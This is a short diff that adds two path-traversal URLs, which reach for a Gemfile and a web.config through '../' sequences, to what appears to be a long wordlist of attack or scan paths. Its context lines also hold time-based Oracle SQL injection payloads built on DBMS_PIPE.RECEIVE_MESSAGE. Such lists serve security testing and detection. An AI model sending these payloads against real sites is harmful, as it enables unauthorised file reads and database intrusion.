@@ -52779,3 +52779,5 @@ http://ifconfig.me/
 /index.php'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'?route=account/return/add
 /new_contact'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
 /@@7flGf?route=account/return/add
+/cf-fonts/s/noto-sans-arabic/5.0.11/arabic/../../../../../Gemfile
+/cf-fonts/s/noto-sans-arabic/5.0.11/arabic/../../../../../web.config
